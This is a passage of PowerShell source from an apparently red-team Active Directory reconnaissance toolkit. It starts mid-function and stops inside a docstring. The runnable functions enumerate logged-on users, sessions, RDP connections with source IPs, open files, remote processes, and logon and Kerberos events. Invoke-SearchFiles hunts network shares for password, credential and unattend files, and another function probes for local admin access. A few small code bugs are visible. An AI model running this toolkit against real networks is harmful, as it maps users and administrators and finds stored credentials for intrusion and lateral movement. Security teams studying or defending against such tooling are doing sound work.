        $TotalRead = 0
        $ResumeHandle = 0

        # get logged on user information
        $Result = $Netapi32::NetWkstaUserEnum($HostName, $QueryLevel,[ref]$PtrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        Write-Debug "Get-NetLoggedon result: $Result"

        # 0 = success
        if (($Result -eq 0) -and ($offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $Increment = $WKSTA_USER_INFO_1::GetSize()

            # parse all the result structures
            for ($i = 0; ($i -lt $EntriesRead); $i++){
                # create a new int ptr at the given offset and cast
                # the pointer as our result structure
                $newintptr = New-Object system.Intptr -ArgumentList $offset
                $Info = $newintptr -as $WKSTA_USER_INFO_1
                # return all the sections of the structure
                $Info | Select-Object *
                $offset = $newintptr.ToInt64()
                $offset += $increment

            }
            # free up the result buffer
            $Netapi32::NetApiBufferFree($PtrInfo) | Out-Null
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetConnections {
    <#
        .SYNOPSIS
        Gets active connections to a server resource.

        .DESCRIPTION
        This function will execute the NetConnectionEnum Win32API call to query
        a given host for users connected to a particular resource.

        Note: only members of the Administrators or Account Operators local group
        can successfully execute NetFileEnum

        .PARAMETER HostName
        The hostname to query.

        .PARAMETER Share
        The share to check connections to.

        .OUTPUTS
        CONNECTION_INFO_1  structure. A representation of the CONNECTION_INFO_1
        result structure which includes the username host of connected users.

        .EXAMPLE
        > Get-NetConnections -HostName fileserver -Share secret
        Returns users actively connected to the share 'secret' on a fileserver.

        .LINK
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName = 'localhost',

        [string]
        $Share = "C$"
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # arguments for NetConnectionEnum
        $QueryLevel = 1
        $ptrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        # get connection information
        $Result = $Netapi32::NetConnectionEnum($HostName, $Share, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        Write-Debug "Get-NetConnection result: $Result"

        # 0 = success
        if (($Result -eq 0) -and ($offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $Increment = $CONNECTION_INFO_1::GetSize()

            # parse all the result structures
            for ($i = 0; ($i -lt $EntriesRead); $i++){
                # create a new int ptr at the given offset and cast
                # the pointer as our result structure
                $newintptr = New-Object system.Intptr -ArgumentList $offset
                $Info = $newintptr -as $CONNECTION_INFO_1
                # return all the sections of the structure
                $Info | Select-Object *
                $offset = $newintptr.ToInt64()
                $offset += $increment

            }
            # free up the result buffer
            $Netapi32::NetApiBufferFree($PtrInfo) | Out-Null
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetSessions {
    <#
        .SYNOPSIS
        Gets active sessions for a specified server.
        Heavily adapted from dunedinite's post on stackoverflow (see LINK below)

        .DESCRIPTION
        This function will execute the NetSessionEnum Win32API call to query
        a given host for active sessions on the host.

        .PARAMETER HostName
        The hostname to query for active sessions.

        .PARAMETER UserName
        The user name to filter for active sessions.

        .OUTPUTS
        SESSION_INFO_10 structure. A representation of the SESSION_INFO_10
        result structure which includes the host and username associated
        with active sessions.

        .EXAMPLE
        > Get-NetSessions
        Returns active sessions on the local host.

        .EXAMPLE
        > Get-NetSessions -HostName sqlserver
        Returns active sessions on the 'sqlserver' host.

        .LINK
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName = 'localhost',

        [string]
        $UserName = ''
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # arguments for NetSessionEnum
        $QueryLevel = 10
        $ptrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        # get session information
        $Result = $Netapi32::NetSessionEnum($HostName, '', $UserName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        Write-Debug "Get-NetSessions result: $Result"

        # 0 = success
        if (($Result -eq 0) -and ($offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $Increment = $SESSION_INFO_10::GetSize()

            # parse all the result structures
            for ($i = 0; ($i -lt $EntriesRead); $i++){
                # create a new int ptr at the given offset and cast
                # the pointer as our result structure
                $newintptr = New-Object system.Intptr -ArgumentList $offset
                $Info = $newintptr -as $SESSION_INFO_10
                # return all the sections of the structure
                $Info | Select-Object *
                $offset = $newintptr.ToInt64()
                $offset += $increment

            }
            # free up the result buffer
            $Netapi32::NetApiBufferFree($PtrInfo) | Out-Null
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetRDPSessions {
    <#
        .SYNOPSIS
        Gets active RDP sessions for a specified server.
        This is a replacement for qwinsta.

        .PARAMETER HostName
        The hostname to query for active RDP sessions.

        .DESCRIPTION
        This function will execute the WTSEnumerateSessionsEx and 
        WTSQuerySessionInformation Win32API calls to query a given
        RDP remote service for active sessions and originating IPs.

        Note: only members of the Administrators or Account Operators local group
        can successfully execute this functionality on a remote target.

        .OUTPUTS
        A custom psobject with the HostName, SessionName, UserName, ID, connection state,
        and source IP of the connection.

        .EXAMPLE
        > Get-NetRDPSessions
        Returns active RDP/terminal sessions on the local host.

        .EXAMPLE
        > Get-NetRDPSessions -HostName "sqlserver"
        Returns active RDP/terminal sessions on the 'sqlserver' host.
    #>
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName = 'localhost'
    )
    
    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # open up a handle to the Remote Desktop Session host
        $handle = $Wtsapi32::WTSOpenServerEx($HostName)

        # if we get a non-zero handle back, everything was successful
        if ($handle -ne 0){

            Write-Debug "WTSOpenServerEx handle: $handle"

            # arguments for WTSEnumerateSessionsEx
            $pLevel = 1
            $filter = 0
            $ppSessionInfo = [IntPtr]::Zero
            $pCount = 0
            
            # get information on all current sessions
            $Result = $Wtsapi32::WTSEnumerateSessionsEx($handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount)

            # Locate the offset of the initial intPtr
            $offset = $ppSessionInfo.ToInt64()

            Write-Debug "WTSEnumerateSessionsEx result: $Result"
            Write-Debug "pCount: $pCount"

            if (($Result -ne 0) -and ($offset -gt 0)) {

                # Work out how mutch to increment the pointer by finding out the size of the structure
                $Increment = $WTS_SESSION_INFO_1::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $pCount); $i++){
     
                    # create a new int ptr at the given offset and cast
                    # the pointer as our result structure
                    $newintptr = New-Object system.Intptr -ArgumentList $offset
                    $Info = $newintptr -as $WTS_SESSION_INFO_1

                    $out = New-Object psobject
                    if (-not $Info.pHostName){
                        # if no hostname returned, use the specified hostname
                        $out | Add-Member Noteproperty 'HostName' $HostName
                    }
                    else{
                        $out | Add-Member Noteproperty 'HostName' $Info.pHostName
                    }
                    $out | Add-Member Noteproperty 'SessionName' $Info.pSessionName
                    if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')){
                        $out | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                    }
                    else {
                        $out | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                    }
                    $out | Add-Member Noteproperty 'ID' $Info.SessionID
                    $out | Add-Member Noteproperty 'State' $Info.State

                    $ppBuffer = [IntPtr]::Zero
                    $pBytesReturned = 0

                    # query for the source client IP
                    #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
                    $Result2 = $Wtsapi32::WTSQuerySessionInformation($handle,$Info.SessionID,14,[ref]$ppBuffer,[ref]$pBytesReturned) 
                    $offset2 = $ppBuffer.ToInt64()
                    $newintptr2 = New-Object System.Intptr -ArgumentList $offset2
                    $Info2 = $newintptr2 -as $WTS_CLIENT_ADDRESS
                    $ip = $Info2.Address         
                    if($ip[2] -ne 0){
                        $SourceIP = [string]$ip[2]+"."+[string]$ip[3]+"."+[string]$ip[4]+"."+[string]$ip[5]
                    }

                    $out | Add-Member Noteproperty 'SourceIP' $SourceIP
                    $out

                    # free up the memory buffer
                    $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                    $offset += $increment
                }
                # free up the memory result buffer
                $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
            }
            # Close off the service handle
            $Null = $Wtsapi32::WTSCloseServer($handle)
        }
        else{
            # otherwise it failed - get the last error
            $err = $Kernel32::GetLastError()
            # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
            Write-Verbuse "LastError: $err"
        }
    }
}


function Get-NetFiles {
    <#
        .SYNOPSIS
        Get files opened on a remote server.

        .DESCRIPTION
        This function will execute the NetFileEnum Win32API call to query
        a given host for information about open files.

        Note: only members of the Administrators or Account Operators local group
        can successfully execute NetFileEnum

        .PARAMETER HostName
        The hostname to query for open files.

        .PARAMETER TargetUser
        Return files open only from this particular user.

        .PARAMETER TargetHost
        Return files open only from this particular host.

        .OUTPUTS
        FILE_INFO_3 structure. A representation of the FILE_INFO_3
        result structure which includes the host and username associated
        with active sessions.

        .EXAMPLE
        > Get-NetFiles -HostName fileserver
        Returns open files/owners on fileserver.

        .EXAMPLE
        > Get-NetFiles -HostName fileserver -TargetUser john
        Returns files opened on fileserver by 'john'

        .EXAMPLE
        > Get-NetFiles -HostName fileserver -TargetHost 192.168.1.100
        Returns files opened on fileserver from host 192.168.1.100

        .LINK
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName = 'localhost',

        [string]
        $TargetUser = '',

        [string]
        $TargetHost
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # if a target host is specified, format/replace variables
        if ($TargetHost){
            $TargetUser = "\\$TargetHost"
        }
    }

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # arguments for NetFileEnum
        $QueryLevel = 3
        $ptrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        # get file information
        $Result = $Netapi32::NetFileEnum($HostName, '', $TargetUser, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        Write-Debug "Get-NetFiles result: $Result"

        # 0 = success
        if (($Result -eq 0) -and ($offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $Increment = $FILE_INFO_3::GetSize()

            # parse all the result structures
            for ($i = 0; ($i -lt $EntriesRead); $i++){
                # create a new int ptr at the given offset and cast
                # the pointer as our result structure
                $newintptr = New-Object system.Intptr -ArgumentList $offset
                $Info = $newintptr -as $FILE_INFO_3
                # return all the sections of the structure
                $Info | Select-Object *
                $offset = $newintptr.ToInt64()
                $offset += $increment

            }
            # free up the result buffer
            $Netapi32::NetApiBufferFree($PtrInfo) | Out-Null
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug  'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetFileSessions {
    <#
        .SYNOPSIS
        Matches up Get-NetSessions with Get-NetFiles to see who
        has opened files on the server and from where.

        .DESCRIPTION
        Matches up Get-NetSessions with Get-NetFiles to see who
        has opened files on the server and from where.

        .PARAMETER HostName
        The hostname to query for open sessions/files.
        Defaults to localhost.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .EXAMPLE
        > Get-NetFileSessions
        Returns open file/session information for the localhost

        .EXAMPLE
        > Get-NetFileSessions -HostName WINDOWS1
        Returns open file/session information for the WINDOWS1 host

        .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName = 'localhost',

        [string]
        $OutFile
    )

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # holder for our session data
        $sessions=@{};

        # grab all the current sessions for the host
        Get-Netsessions -HostName $HostName | ForEach-Object { $sessions[$_.sesi10_username] = $_.sesi10_cname };

        # mesh the NetFiles data with the NetSessions data
        $data = Get-NetFiles | Select-Object @{Name='Username';Expression={$_.fi3_username}},@{Name='Filepath';Expression={$_.fi3_pathname}},@{Name='Computer';Expression={$sess[$_.fi3_username]}}

        # output to a CSV file if specified
        if ($OutFile) {
            $data | export-csv -notypeinformation -path $OutFile
        }
        else{
            # otherwise just dump everything to stdout
            $data
        }
    }
}


function Get-LastLoggedOn {
    <#
        .SYNOPSIS
        Gets the last user logged onto a target machine.

        .DESCRIPTION
        This function uses remote registry functionality to return
        the last user logged onto a target machine.

        Note: This function requires administrative rights on the
        machine you're enumerating.

        .PARAMETER HostName
        The hostname to query for open files. Defaults to the
        local host name.

        .OUTPUTS
        The last loggedon user name, or $null if the enumeration fails.

        .EXAMPLE
        > Get-LastLoggedOn
        Returns the last user logged onto the local machine.

        .EXAMPLE
        > Get-LastLoggedOn -HostName WINDOWS1
        Returns the last user logged onto WINDOWS1
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        $HostName = "."
    )

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # try to open up the remote registry key to grab the last logged on user
        try{
            $reg = [WMIClass]"\\$HostName\root\default:stdRegProv"
            $hklm = 2147483650
            $key = "SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI"
            $value = "LastLoggedOnUser"
            $reg.GetStringValue($hklm, $key, $value).sValue
        }
        catch{
            Write-Warning "[!] Error opening remote registry on $HostName. Remote registry likely not enabled."
            $null
        }
    }
}


function Get-NetProcesses {
    <#
        .SYNOPSIS
        Gets a list of processes/owners on a remote machine.

        .PARAMETER HostName
        The hostname to query for open files. Defaults to the
        local host name.

        .PARAMETER RemoteUserName
        The "domain\username" to use for the WMI call on a remote system.
        If supplied, 'RemotePassword' must be supplied as well.

        .PARAMETER RemotePassword
        The password to use for the WMI call on a remote system.

        .OUTPUTS
        The last loggedon user name, or $null if the enumeration fails.

        .EXAMPLE
        > Get-LastLoggedOn
        Returns the last user logged onto the local machine.

        .EXAMPLE
        > Get-LastLoggedOn -HostName WINDOWS1
        Returns the last user logged onto WINDOWS1
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName,

        [string]
        $RemoteUserName,

        [string]
        $RemotePassword
    )

    process {
        # default to the local hostname
        if (-not $HostName){
            $HostName = [System.Net.Dns]::GetHostName()
        }

        # process multiple object types
        $HostName = Get-NameField $HostName

        $Credential = $Null

        if($RemoteUserName){
            if($RemotePassword){
                $Password = $RemotePassword | ConvertTo-SecureString -asPlainText -Force
                $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)

                # try to enumerate the processes on the remote machine using the supplied credential
                try{
                    Get-WMIobject -Class Win32_process -ComputerName $HostName -Credential $Credential | % {
                        $owner=$_.getowner();
                        $out = new-object psobject
                        $out | add-member Noteproperty 'Host' $HostName
                        $out | add-member Noteproperty 'Process' $_.ProcessName
                        $out | add-member Noteproperty 'PID' $_.ProcessID
                        $out | add-member Noteproperty 'Domain' $owner.Domain
                        $out | add-member Noteproperty 'User' $owner.User
                        $out
                    }
                }
                catch{
                    Write-Verbose "[!] Error enumerating remote processes, access likely denied"
                }
            }
            else{
                Write-Warning "[!] RemotePassword must also be supplied!"
            }
        }
        else{
            # try to enumerate the processes on the remote machine
            try{
                Get-WMIobject -Class Win32_process -ComputerName $HostName | % {
                    $owner=$_.getowner();
                    $out = new-object psobject
                    $out | add-member Noteproperty 'Host' $HostName
                    $out | add-member Noteproperty 'Process' $_.ProcessName
                    $out | add-member Noteproperty 'PID' $_.ProcessID
                    $out | add-member Noteproperty 'Domain' $owner.Domain
                    $out | add-member Noteproperty 'User' $owner.User
                    $out
                }
            }
            catch{
                Write-Verbose "[!] Error enumerating remote processes, access likely denied"
            }
        }
    }
}


function Get-UserLogonEvents {
    <#
        .SYNOPSIS
        Dump and parse security events relating to an account logon (ID 4624).

        Author: @sixdub

        .DESCRIPTION
        Provides information about all users who have logged on and where they
        logged on from. Intended to be used and tested on
        Windows 2008 Domain Controllers.
        Admin Reqd? YES

        .PARAMETER HostName
        The computer to get events from. Default: Localhost

        .PARAMETER DateStart
        Filter out all events before this date. Default: 5 days

        .LINK
        http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
    #>

    Param(
        [string]
        $HostName=$env:computername,

        [DateTime]
        $DateStart=[DateTime]::Today.AddDays(-5)
    )

    #grab all events matching our filter for the specified host
    Get-WinEvent -ComputerName $HostName -FilterHashTable @{ LogName = "Security"; ID=4624; StartTime=$datestart} -ErrorAction SilentlyContinue | % {

        #first parse and check the logon type. This could be later adapted and tested for RDP logons (type 10)
        if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))'){
            if($matches){
                $logontype=$matches[0].trim()
                $matches = $Null
            }
        }

        #interactive logons or domain logons
        if (($logontype -eq 2) -or ($logontype -eq 3)){
            try{
                # parse and store the account used and the address they came from
                if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)'){
                    if($matches){
                        $account = $matches[0].split("`n")[2].split(":")[1].trim()
                        $domain = $matches[0].split("`n")[3].split(":")[1].trim()
                        $matches = $Null
                    }
                }
                if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)'){
                    if($matches){
                        $addr=$matches[0].split("`n")[2].split(":")[1].trim()
                        $matches = $Null
                    }
                }

                # only add if there was account information not for a machine or anonymous logon
                if ($account -and (-not $account.endsWith("$")) -and ($account -ne "ANONYMOUS LOGON"))
                {
                    $out = New-Object psobject
                    $out | Add-Member NoteProperty 'Domain' $domain
                    $out | Add-Member NoteProperty 'Username' $account
                    $out | Add-Member NoteProperty 'Address' $addr
                    $out | Add-Member NoteProperty 'Time' $_.TimeCreated
                    $out
                }
            }
            catch{}
        }
    }
}


function Get-UserTGTEvents {
    <#
        .SYNOPSIS
        Dump and parse security events relating to kerberos TGT requests (ID 4768).
        Use this against a domain controllers, duh :)

        .PARAMETER HostName
        The computer to get events from. Default: Localhost

        .PARAMETER DateStart
        Filter out all events before this date. Default: 5 days

        .LINK
        http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
    #>

    Param(
        [string]
        $HostName=$env:computername,

        [DateTime]
        $DateStart=[DateTime]::Today.AddDays(-5)
    )

    Get-WinEvent -ComputerName $HostName -FilterHashTable @{ LogName = "Security"; ID=4768; StartTime=$datestart} -ErrorAction SilentlyContinue | % {

        try{
            if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)'){
                if($matches){
                    $account = $matches[0].split("`n")[1].split(":")[1].trim()
                    $domain = $matches[0].split("`n")[2].split(":")[1].trim()
                    $matches = $Null
                }
            }

            if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)'){
                if($matches){
                    $addr = $matches[0].split("`n")[1].split(":")[-1].trim()
                    $matches = $Null
                }
            }

            $out = New-Object psobject
            $out | Add-Member NoteProperty 'Domain' $domain
            $out | Add-Member NoteProperty 'Username' $account
            $out | Add-Member NoteProperty 'Address' $addr
            $out | Add-Member NoteProperty 'Time' $_.TimeCreated
            $out
        }
        catch{}
    }
}


function Get-UserProperties {
    <#
        .SYNOPSIS
        Returns a list of all user object properties. If a property
        name is specified, it returns all [user:property] values.

        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html

        .DESCRIPTION
        This function a list of all user object properties, optionally
        returning all the user:property combinations if a property
        name is specified.

        .PARAMETER Domain
        The domain to query for user properties.

        .PARAMETER Properties
        Return property names for users.

        .EXAMPLE
        > Get-UserProperties
        Returns all user properties for users in the current domain.

        .EXAMPLE
        > Get-UserProperties -Properties ssn,lastlogon,location
        Returns all an array of user/ssn/lastlogin/location combinations
        for users in the current domain.

        .EXAMPLE
        > Get-UserProperties -Domain testing
        Returns all user properties for users in the 'testing' domain.

        .LINK
        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
    #>

    [CmdletBinding()]
    param(
        [string]
        $Domain,

        [string[]]
        $Properties
    )

    if($Properties) {
        # extract out the set of all properties for each object
        Get-NetUser -Domain $Domain | % {

            $out = new-object psobject
            $out | add-member Noteproperty 'Name' $_.name

            if($Properties -isnot [system.array]){
                $Properties = @($Properties)
            }
            foreach($Property in $Properties){
                try {
                    $out | add-member Noteproperty $Property $_.$Property
                }
                catch {}
            }
            $out
        }
    }
    else{
        # extract out just the property names
        Get-NetUser -Domain $Domain | Select -first 1 | Get-Member -MemberType *Property | Select-Object -Property "Name"
    }
}


function Get-ComputerProperties {
    <#
        .SYNOPSIS
        Returns a list of all computer object properties. If a property
        name is specified, it returns all [computer:property] values.

        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html

        .DESCRIPTION
        This function a list of all computer object properties, optinoally
        returning all the computer:property combinations if a property
        name is specified.

        .PARAMETER Domain
        The domain to query for computer properties.

        .PARAMETER Properties
        Return property names for computers.

        .EXAMPLE
        > Get-ComputerProperties
        Returns all computer properties for computers in the current domain.

        .EXAMPLE
        > Get-ComputerProperties -Properties ssn,lastlogon,location
        Returns all an array of computer/ssn/lastlogin/location combinations
        for computers in the current domain.

        .EXAMPLE
        > Get-ComputerProperties -Domain testing
        Returns all user properties for computers in the 'testing' domain.

        .LINK
        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
    #>

    [CmdletBinding()]
    param(
        [string]
        $Domain,

        [string[]]
        $Properties
    )

    if($Properties) {
        # extract out the set of all properties for each object
        Get-NetComputers -Domain $Domain -FullData | % {

            $out = new-object psobject
            $out | add-member Noteproperty 'Name' $_.name

            if($Properties -isnot [system.array]){
                $Properties = @($Properties)
            }
            foreach($Property in $Properties){
                try {
                    $out | add-member Noteproperty $Property $_.$Property
                }
                catch {}
            }
            $out
        }
    }
    else{
        # extract out just the property names
        Get-NetComputers -Domain $Domain -FullData | Select -first 1 | Get-Member -MemberType *Property | Select-Object -Property "Name"
    }
}


function Invoke-SearchFiles {
    <#
        .SYNOPSIS
        Searches a given server/path for files with specific terms in the name.

        .DESCRIPTION
        This function recursively searches a given UNC path for files with
        specific keywords in the name (default of pass, sensitive, secret, admin,
        login and unattend*.xml). The output can be piped out to a csv with the
        -OutFile flag. By default, hidden files/folders are included in search results.

        .PARAMETER Path
        UNC/local path to recursively search.

        .PARAMETER Terms
        Terms to search for.

        .PARAMETER OfficeDocs
        Search for office documents (*.doc*, *.xls*, *.ppt*)

        .PARAMETER FreshEXES
        Find .EXEs accessed within the last week.

        .PARAMETER AccessDateLimit
        Only return files with a LastAccessTime greater than this date value.

        .PARAMETER WriteDateLimit
        Only return files with a LastWriteTime greater than this date value.

        .PARAMETER CreateDateLimit
        Only return files with a CreationDate greater than this date value.

        .PARAMETER ExcludeFolders
        Exclude folders from the search results.

        .PARAMETER ExcludeHidden
        Exclude hidden files and folders from the search results.

        .PARAMETER CheckWriteAccess
        Only returns files the current user has write access to.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .OUTPUTS
        The full path, owner, lastaccess time, lastwrite time, and size for
        each found file.

        .EXAMPLE
        > Invoke-SearchFiles -Path \\WINDOWS7\Users\
        Returns any files on the remote path \\WINDOWS7\Users\ that have 'pass',
        'sensitive', or 'secret' in the title.

        .EXAMPLE
        > Invoke-SearchFiles -Path \\WINDOWS7\Users\ -Terms salaries,email -OutFile out.csv
        Returns any files on the remote path \\WINDOWS7\Users\ that have 'salaries'
        or 'email' in the title, and writes the results out to a csv file
        named 'out.csv'

        .EXAMPLE
        > Invoke-SearchFiles -Path \\WINDOWS7\Users\ -AccessDateLimit 6/1/2014
        Returns all files accessed since 6/1/2014.

        .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $Path = '.\',

        [string[]]
        $Terms,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXES,

        [string]
        $AccessDateLimit = '1/1/1970',

        [string]
        $WriteDateLimit = '1/1/1970',

        [string]
        $CreateDateLimit = '1/1/1970',

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [string]
        $OutFile
    )

    begin {
        # default search terms
        $SearchTerms = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config')

        # check if custom search terms were passed
        if ($Terms){
            if($Terms -isnot [system.array]){
                $Terms = @($Terms)
            }
            $SearchTerms = $Terms
        }

        # append wildcards to the front and back of all search terms
        for ($i = 0; $i -lt $SearchTerms.Count; $i++) {
            $SearchTerms[$i] = "*$($SearchTerms[$i])*"
        }

        # search just for office documents if specified
        if ($OfficeDocs){
            $SearchTerms = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }

        # find .exe's accessed within the last 7 days
        if($FreshEXES){
            # get an access time limit of 7 days ago
            $AccessDateLimit = (get-date).AddDays(-7).ToString('MM/dd/yyyy')
            $SearchTerms = '*.exe'
        }
    }

    process {
        Write-Verbose "[*] Search path $Path"

        # build our giant recursive search command w/ conditional options
        $cmd = "get-childitem $Path -rec $(if(-not $ExcludeHidden){`"-Force`"}) -ErrorAction SilentlyContinue -include $($SearchTerms -join `",`") | where{ $(if($ExcludeFolders){`"(-not `$_.PSIsContainer) -and`"}) (`$_.LastAccessTime -gt `"$AccessDateLimit`") -and (`$_.LastWriteTime -gt `"$WriteDateLimit`") -and (`$_.CreationTime -gt `"$CreateDateLimit`")} | select-object FullName,@{Name='Owner';Expression={(Get-Acl `$_.FullName).Owner}},LastAccessTime,LastWriteTime,Length $(if($CheckWriteAccess){`"| where { `$_.FullName } | where { Invoke-CheckWrite -Path `$_.FullName }`"}) $(if($OutFile){`"| export-csv -Append -notypeinformation -path $OutFile`"})"

        # execute the command
        Invoke-Expression $cmd
    }
}


function Invoke-CheckLocalAdminAccess {
    <#
        .SYNOPSIS
        Checks if the current user context has local administrator access
        to a specified host or IP.

        Idea stolen from the local_admin_search_enum post module in
        Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

        .DESCRIPTION
        This function will use the OpenSCManagerW Win32API call to to establish
        a handle to the remote host. If this succeeds, the current user context
        has local administrator acess to the target.

        .PARAMETER HostName
        The hostname to query for active sessions.

        .OUTPUTS
        $true if the current user has local admin access to the hostname,
        $false otherwise

        .EXAMPLE
        > Invoke-CheckLocalAdminAccess -HostName sqlserver
        Returns active sessions on the local host.

        .LINK
